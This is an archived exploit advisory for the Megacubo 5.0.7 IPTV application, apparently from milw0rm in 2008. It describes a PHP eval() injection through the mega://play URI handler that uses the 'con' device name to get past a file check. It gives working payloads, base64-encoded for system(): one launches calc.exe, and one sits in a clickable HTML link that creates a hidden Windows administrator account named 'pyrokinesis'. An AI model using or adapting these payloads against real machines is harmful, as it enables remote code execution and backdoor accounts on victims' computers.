<html><head><title>Megacubo 5.0.7 (mega://) Remote eval() Injection Exploit</title></head><pre>&lt;!--
Megacubo 5.0.7 (mega://) remote eval() injection exploit
by Nine:Situations:Group::pyrokinesis
site: http://retrogod.altervista.org/

tested against Internet Explorer 8 beta 2/xp sp 3

software site: http://www.megacubo.net/tv/
download url: http://sourceforge.net/project/showfiles.php?group_id=231636&amp;package_id=280849&amp;release_id=608023

description:
&quot;Megacubo is a IPTV tuner application written in PHP + Winbinder.
It has a catalogue of links of TV streams which are available
for free in the web. At the moment it only runs on Windows(2000,
XP and Vista).&quot;
(note that it is among most downloaded apps on sourceforge, http://sourceforge.net/softwaremap/trove_list.php?form_cat=99)

explaination:
it's possible to pass arbitrary php code to the &quot;play&quot; command
of &quot;mega://&quot; uri handler which is further copied to the
c:\DATASTORE.txt temporary file and evaluated, note the &quot;con&quot;
argument (which is a windows device name) to bypass a file_exists()
check

example exploit, this run calc.exe:

mega://play|con..&quot;a()&quot;.system(base64_decode('Y21kIC9jIHN0YXJ0IGNhbGM=')).&quot;/?&quot;);print(

the following one execute:
cmd /c NET USER pyrokinesis pass /ADD &amp;&amp; NET LOCALGROUP Administrators /ADD pyrokinesis
--&gt;

&lt;a href='mega://play|con..&quot;a()&quot;.system(base64_decode(Y21kIC9jIE5FVCBVU0VSIHB5cm9raW5lc2lzIHBhc3MgL0FERCAmJiBORVQgTE9DQUxHUk9VUCBBZG1pbmlzdHJhdG9ycyAvQUREIHB5cm9raW5lc2lz)).&quot;/?&quot;);print('&gt;pwn&lt;/a&gt;

# milw0rm.com [2008-12-30]</pre></html>